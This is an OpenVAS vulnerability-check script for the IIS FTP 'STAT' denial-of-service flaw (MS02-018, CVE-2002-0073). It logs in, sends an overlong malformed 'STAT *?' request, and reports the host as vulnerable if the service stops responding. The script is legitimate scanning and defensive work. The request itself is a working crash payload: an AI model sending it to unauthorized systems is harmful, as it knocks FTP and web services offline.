###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms02-018_remote.nasl 3046 2016-04-11 13:53:51Z benallard $
#
# Microsoft IIS FTP Connection Status Request Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allows remote users to crash the application
  leading to denial of service condition or execute arbitrary code.
  Impact Level: System/Application";
tag_affected = "Microsoft Internet Information Services version 4.0, 5.0 and 5.1";
tag_insight = "Error in the handling of FTP session status requests. If a remote attacker
  with an existing FTP session sends a malformed FTP session status request,
  an access violation error could occur that would cause the termination of
  FTP and Web services on the affected server.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link.
  http://technet.microsoft.com/en-us/security/bulletin/ms02-018";
tag_summary = "his host is missing important security update according to
  Microsoft Bulletin MS02-018.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802441";
CPE = "cpe:/a:microsoft:iis_ftp";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3046 $");
  script_cve_id("CVE-2002-0073");
  script_bugtraq_id(4482);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-04-11 15:53:51 +0200 (Mon, 11 Apr 2016) $");
  script_tag(name:"creation_date", value:"2012-07-04 18:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Connection Status Request Denial of Service Vulnerability");

  script_summary("Check for Denial of Service vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("MS/IIS-FTP/Installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/8801");
  script_xref(name : "URL" , value : "http://www.cert.org/advisories/CA-2002-09.html");
  script_xref(name : "URL" , value : "http://marc.info/?l=bugtraq&m=101901273810598&w=2");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms02-018");
  script_xref(name : "URL" , value : "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20020415-ms02-018");
  exit(0);
}


include("ftp_func.inc");
include("host_details.inc");

ftpPort = "";
soc = "";
ftplogin = "";
recv = "";
req = "";

## Get the FTP port
if(!ftpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check for the port state
if(!get_port_state(ftpPort)){
  exit(0);
}

## Check for the broken port
if(get_kb_item('ftp/'+ftpPort+'/broken')){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

login = get_kb_item("ftp/login");
if(!login){
  login = "anonymous";
}

pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);

## Exit if not able to login
if(!ftplogin)
{
  close(soc);
  exit(0);
}

## Construct the attack request
req = string("STAT *?", crap(1240), "\r\n");
send(socket:soc, data:req);

## wait
sleep(3);

## Check is server is responding
send(socket:soc, data:string("HELP\r\n"));
recv = ftp_recv_line(socket:soc);

if(!recv){
  security_message(port:ftpPort);
}

close(soc);
